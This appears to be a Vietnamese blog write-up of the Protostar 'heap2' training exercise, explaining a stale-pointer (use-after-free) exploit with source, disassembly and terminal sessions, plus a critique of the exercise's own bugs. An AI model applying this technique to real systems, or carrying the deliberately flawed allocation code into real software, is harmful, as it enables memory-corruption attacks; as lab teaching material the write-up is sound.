---
layout: post
title: heap2
---

Trong bài này, chúng ta sẽ đọc hiểu và exploit chương trình với stale pointer.
Stale pointer là pointer đã được free nhưng sau đó vẫn được gọi lại.
Sau đây là source code và asm code của chương trình heap2.

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

struct auth {
  char name[32];
  int auth;
};

struct auth *auth;
char *service;

int main(int argc, char **argv)
{
  char line[128];

  while(1) {
    printf("[ auth = %p, service = %p ]\n", auth, service);

    if(fgets(line, sizeof(line), stdin) == NULL) break;
    
    if(strncmp(line, "auth ", 5) == 0) {
      auth = malloc(sizeof(auth));
      memset(auth, 0, sizeof(auth));
      if(strlen(line + 5) < 31) {
        strcpy(auth->name, line + 5);
      }
    }
    if(strncmp(line, "reset", 5) == 0) {
      free(auth);
    }
    if(strncmp(line, "service", 6) == 0) {
      service = strdup(line + 7);
    }
    if(strncmp(line, "login", 5) == 0) {
      if(auth->auth) {
        printf("you have logged in already!\n");
      } else {
        printf("please enter your password\n");
      }
    }
  }
}
```
```asm
0x08048934 <main+0>:    push   ebp
0x08048935 <main+1>:    mov    ebp,esp
0x08048937 <main+3>:    and    esp,0xfffffff0
0x0804893a <main+6>:    sub    esp,0x90
0x08048940 <main+12>:   jmp    0x8048943 <main+15>
0x08048942 <main+14>:   nop
0x08048943 <main+15>:   mov    ecx,DWORD PTR ds:0x804b5f8
0x08048949 <main+21>:   mov    edx,DWORD PTR ds:0x804b5f4
0x0804894f <main+27>:   mov    eax,0x804ad70
0x08048954 <main+32>:   mov    DWORD PTR [esp+0x8],ecx
0x08048958 <main+36>:   mov    DWORD PTR [esp+0x4],edx
0x0804895c <main+40>:   mov    DWORD PTR [esp],eax
0x0804895f <main+43>:   call   0x804881c <printf@plt>
0x08048964 <main+48>:   mov    eax,ds:0x804b164
0x08048969 <main+53>:   mov    DWORD PTR [esp+0x8],eax
0x0804896d <main+57>:   mov    DWORD PTR [esp+0x4],0x80
0x08048975 <main+65>:   lea    eax,[esp+0x10]
0x08048979 <main+69>:   mov    DWORD PTR [esp],eax
0x0804897c <main+72>:   call   0x80487ac <fgets@plt>
0x08048981 <main+77>:   test   eax,eax
0x08048983 <main+79>:   jne    0x8048987 <main+83>
0x08048985 <main+81>:   leave
0x08048986 <main+82>:   ret
0x08048987 <main+83>:   mov    DWORD PTR [esp+0x8],0x5
0x0804898f <main+91>:   mov    DWORD PTR [esp+0x4],0x804ad8d
0x08048997 <main+99>:   lea    eax,[esp+0x10]
0x0804899b <main+103>:  mov    DWORD PTR [esp],eax
0x0804899e <main+106>:  call   0x804884c <strncmp@plt>
0x080489a3 <main+111>:  test   eax,eax
0x080489a5 <main+113>:  jne    0x8048a01 <main+205>
0x080489a7 <main+115>:  mov    DWORD PTR [esp],0x4
0x080489ae <main+122>:  call   0x804916a <malloc>
0x080489b3 <main+127>:  mov    ds:0x804b5f4,eax
0x080489b8 <main+132>:  mov    eax,ds:0x804b5f4
0x080489bd <main+137>:  mov    DWORD PTR [esp+0x8],0x4
0x080489c5 <main+145>:  mov    DWORD PTR [esp+0x4],0x0
0x080489cd <main+153>:  mov    DWORD PTR [esp],eax
0x080489d0 <main+156>:  call   0x80487bc <memset@plt>
0x080489d5 <main+161>:  lea    eax,[esp+0x10]
0x080489d9 <main+165>:  add    eax,0x5
0x080489dc <main+168>:  mov    DWORD PTR [esp],eax
0x080489df <main+171>:  call   0x80487fc <strlen@plt>
0x080489e4 <main+176>:  cmp    eax,0x1e
0x080489e7 <main+179>:  ja     0x8048a01 <main+205>
0x080489e9 <main+181>:  lea    eax,[esp+0x10]
0x080489ed <main+185>:  lea    edx,[eax+0x5]
0x080489f0 <main+188>:  mov    eax,ds:0x804b5f4
0x080489f5 <main+193>:  mov    DWORD PTR [esp+0x4],edx
0x080489f9 <main+197>:  mov    DWORD PTR [esp],eax
0x080489fc <main+200>:  call   0x804880c <strcpy@plt>
0x08048a01 <main+205>:  mov    DWORD PTR [esp+0x8],0x5
0x08048a09 <main+213>:  mov    DWORD PTR [esp+0x4],0x804ad93
0x08048a11 <main+221>:  lea    eax,[esp+0x10]
0x08048a15 <main+225>:  mov    DWORD PTR [esp],eax
0x08048a18 <main+228>:  call   0x804884c <strncmp@plt>
0x08048a1d <main+233>:  test   eax,eax
0x08048a1f <main+235>:  jne    0x8048a2e <main+250>
0x08048a21 <main+237>:  mov    eax,ds:0x804b5f4
0x08048a26 <main+242>:  mov    DWORD PTR [esp],eax
0x08048a29 <main+245>:  call   0x804999c <free>
0x08048a2e <main+250>:  mov    DWORD PTR [esp+0x8],0x6
0x08048a36 <main+258>:  mov    DWORD PTR [esp+0x4],0x804ad99
0x08048a3e <main+266>:  lea    eax,[esp+0x10]
0x08048a42 <main+270>:  mov    DWORD PTR [esp],eax
0x08048a45 <main+273>:  call   0x804884c <strncmp@plt>
0x08048a4a <main+278>:  test   eax,eax
0x08048a4c <main+280>:  jne    0x8048a62 <main+302>
0x08048a4e <main+282>:  lea    eax,[esp+0x10]
0x08048a52 <main+286>:  add    eax,0x7
0x08048a55 <main+289>:  mov    DWORD PTR [esp],eax
0x08048a58 <main+292>:  call   0x804886c <strdup@plt>
0x08048a5d <main+297>:  mov    ds:0x804b5f8,eax
0x08048a62 <main+302>:  mov    DWORD PTR [esp+0x8],0x5
0x08048a6a <main+310>:  mov    DWORD PTR [esp+0x4],0x804ada1
0x08048a72 <main+318>:  lea    eax,[esp+0x10]
0x08048a76 <main+322>:  mov    DWORD PTR [esp],eax
0x08048a79 <main+325>:  call   0x804884c <strncmp@plt>
0x08048a7e <main+330>:  test   eax,eax
0x08048a80 <main+332>:  jne    0x8048942 <main+14>
0x08048a86 <main+338>:  mov    eax,ds:0x804b5f4
0x08048a8b <main+343>:  mov    eax,DWORD PTR [eax+0x20]
0x08048a8e <main+346>:  test   eax,eax
0x08048a90 <main+348>:  je     0x8048aa3 <main+367>
0x08048a92 <main+350>:  mov    DWORD PTR [esp],0x804ada7
0x08048a99 <main+357>:  call   0x804883c <puts@plt>
0x08048a9e <main+362>:  jmp    0x8048943 <main+15>
0x08048aa3 <main+367>:  mov    DWORD PTR [esp],0x804adc3
0x08048aaa <main+374>:  call   0x804883c <puts@plt>
0x08048aaf <main+379>:  jmp    0x8048943 <main+15>
```

Mục tiêu là thay đổi giá trị `auth` trong một biến có type là struct `auth`.
Chương trình heap2 sẽ làm những việc sau đây.

1. Chạy một vòng loop vô hạn
2. Mỗi lượt, chương trình sẽ đọc lệnh do người dùng nhập vào stdin. Ta có cách lệnh:
* auth <string>
* reset
* service <stirng>
* login
3. Khi một lệnh được nhập vào, chương trình sẽ thực hiện một chuỗi lệnh khác nhau.

Tuy nhiên cũng cần lưu ý trước là chương trình có khá nhiều bug sau khi đọc asm code so với source code.
Vì vậy, trước hết, chúng ta sẽ giả định chương trình hoạt động theo đúng "mong muốn" ban đầu và chúng ta sẽ exploit chương trình theo hướng stale pointer.
Các bug sẽ được đề cập sau.

Đối với gợi ý exploit sử dụng stale pointer, ta để ý rằng biến pointer `auth` được `free` khi nhận lệnh reset.
Tuy nhiên sau khi `free`, biến này vẫn có khả năng được sử dụng nếu người dùng nhập lệnh login.
Để exploit stale pointer, chúng ta sẽ giả thiết rằng sau khi free, chúng ta vẫn có thể gán lại địa chỉ này cho một biến khác và có thể ghi vào đó.
Theo đó, ta sẽ chọn flow cho chương trình như sau.

1. Khởi tạo địa chỉ cho `auth` qua `malloc`. Việc này được thực hiện qua lệnh auth
2. Free địa chỉ này, chỉ để trả quyền sử dụng cho một biến khác. Việc này được thực hiện qua lệnh reset
3. Xin cấp lại một địa chỉ trên heap với mục tiêu lấy lại quyền ghi vào vùng chứa biến int `auth` thuộc struct `auth`. Việc này được thực hiện qua lệnh service. Chúng ta sẽ hy vọng rằng biến mới có địa chỉ nhỏ hơn địa chỉ đến int `auth` trong struct.
4. Sau khi cấp địa chỉ, ghi một giá trị vào đó để cố gắng làm tràn đến int `auth`.
5. Dùng lệnh login để kiểm tra mục tiêu.

Với flow này, ta kiểm tra chương trình, <span style="color:springgreen">thông tin</span> và <span style="color:aqua">nhập vào</span>, theo từng bước như sau.

<pre class="memory">
<span style="color:springgreen">[ auth = (nil), service = (nil) ]</span>
<span style="color:aqua">auth abcd</span>
<span style="color:springgreen">[ auth = 0x804c008, service = (nil) ]</span>
<span style="color:aqua">service 1</span>
<span style="color:springgreen">[ auth = 0x804c008, service = 0x804c018 ]</span>
</pre>

Ở đoạn ví dụ trên, chúng ta không free `auth` mà tiếp tục xin cấp bộ nhớ trên heap.
Địa chỉ của `auth` và `service` là `0x804c008` và `0x804c018`, khác nhau.
Nếu có `free` trước khi xin cấp bộ nhớ cho biến `service`, ta có kết quả như sau.

<pre class="memory">
<span style="color:springgreen">[ auth = (nil), service = (nil) ]</span>
<span style="color:aqua">auth abcd</span>
<span style="color:springgreen">[ auth = 0x804c008, service = (nil) ]</span>
<span style="color:aqua">reset</span>
<span style="color:springgreen">[ auth = 0x804c008, service = (nil) ]</span>
<span style="color:aqua">service 1</span>
<span style="color:springgreen">[ auth = 0x804c008, service = 0x804c008 ]</span>
</pre>

Lúc này, `service` đã lấy lại giá trị cũ của `auth`.
Hai biến này về cơ bản là có cùng địa chỉ.
Như vậy thay vì chạy lệnh service 1, ta sẽ vẫn dùng lệnh này nhưng với giá trị nhập vào đủ lớn để ghi được qua vị trí của int `auth` trong `auth`.
Với struct `auth` và pointer `auth`, ta sẽ phân bố vùng nhớ gồm 32 byte đầu cho `auth->name` và 4 byte sau cho `auth->auth`.
Như vậy, ta sẽ dùng chuỗi dài ít nhất 33 byte với byte cuối khác `\0` cho lệnh service.
Như sau là một cách.

<pre class="memory">
<span style="color:springgreen">[ auth = (nil), service = (nil) ]</span>
<span style="color:aqua">auth abcd</span>
<span style="color:springgreen">[ auth = 0x804c008, service = (nil) ]</span>
<span style="color:aqua">reset</span>
<span style="color:springgreen">[ auth = 0x804c008, service = (nil) ]</span>
<span style="color:aqua">service 11112222333344441</span>
<span style="color:springgreen">[ auth = 0x804c008, service = 0x804c018 ]</span>
<span style="color:aqua">login</span>
<span style="color:springgreen">you have logged in already!</span>
<span style="color:springgreen">[ auth = 0x804c008, service = 0x804c018 ]</span>
</pre>

Mục tiêu đã hoàn thành!

Tuy nhiên!

Tuy nhiên, chúng ta thấy chương trình báo rằng `service` thực sự nằm ở `0x804c018` thay vì trùng với `auth` tại `0x804c008`.
Việc này cùng một số quan sát khác và bug của chương trình, mình sẽ liệt ra như sau.

* Tác giả sử dụng quá nhiều thứ với tên `auth`. Khi đọc bài viết, hẳn các bạn cũng sẽ bị rố. Trong chương trình có struct tên `auth`, trong struct có biến int tên `auth`, và ngoài struct là biến global pointer trên `auth`. Không rõ có phải hay không nhưng do cách đặt tên này làm cả tác giả bị lẫn. Khi xin cấp bộ nhớ cho pointer `auth`, tác giả dùng `sizeof` với struct nhưng thật sự chương trình đã compile thành `sizeof` với biến pointer. Và đúng ra sẽ xin cấp 36 byte bộ nhớ nhưng lại thành cấp 4 byte. Việc này được thể hiện cả trong asm code của chương trình.
* Một số lệnh được viết khá cẩu thả. Ví dụ như lệnh service. Đúng ra tác giá sẽ muốn dùng `strncmp` với độ dài là 7 ký tự, nhưng chương trình viết thành 6. Do đó, nếu bạn chạy lệnh servic thì điều kiện lệnh vẫn thỏa mãn. Hoặc nếu dùng lệnh service thì ký tự dấu cách sau service cũng được tính để ghi thành chuỗi thay vì làm thành phần lệnh.
* Với ví dụ cuối cùng, mặc dù đã `free` biến `auth` nhưng khi cấp bộ nhớ, biến `service` vẫn nhận một địa chỉ mới. Mình đã thử và thấy nếu chuỗi đi với lệnh service có trên 12 byte thì `service` sẽ nhận địa chỉ mới.
* Cũng cần lưu ý rằng nếu nhập lệnh service thì ký tự cuối sẽ là `\0x0a` (line feed) và null-terminated character. Như vậy chỉ cần 10 ký tự theo sau lệnh thì tổng số ký tự sẽ là 12.

```bash
user@protostar:~$ heap2
[ auth = (nil), service = (nil) ]
auth abcd
[ auth = 0x804c008, service = (nil) ]
reset
[ auth = 0x804c008, service = (nil) ]
servic 1111222233
[ auth = 0x804c008, service = 0x804c008 ]
```

```bash
user@protostar:~$ heap2
[ auth = (nil), service = (nil) ]
auth abcd
[ auth = 0x804c008, service = (nil) ]
reset
[ auth = 0x804c008, service = (nil) ]
servic 11112222333
[ auth = 0x804c008, service = 0x804c018 ]
```

Phần source code này thực sự khá cẩu thả nên về cơ bản chúng ta chỉ cần nắm được lý thuyết về stale pointer sau bài này là ổn.

## Ref
```bash
user@protostar:~$ heap2
[ auth = (nil), service = (nil) ]
auth abcd
[ auth = 0x804c008, service = (nil) ]
reset
[ auth = 0x804c008, service = (nil) ]
service 11112222333344441
[ auth = 0x804c008, service = 0x804c018 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]
```

```bash
user@protostar:~$ heap2
[ auth = (nil), service = (nil) ]
auth abcd
[ auth = 0x804c008, service = (nil) ]
reset
[ auth = 0x804c008, service = (nil) ]
servic 1111222233334444
[ auth = 0x804c008, service = 0x804c018 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]
```
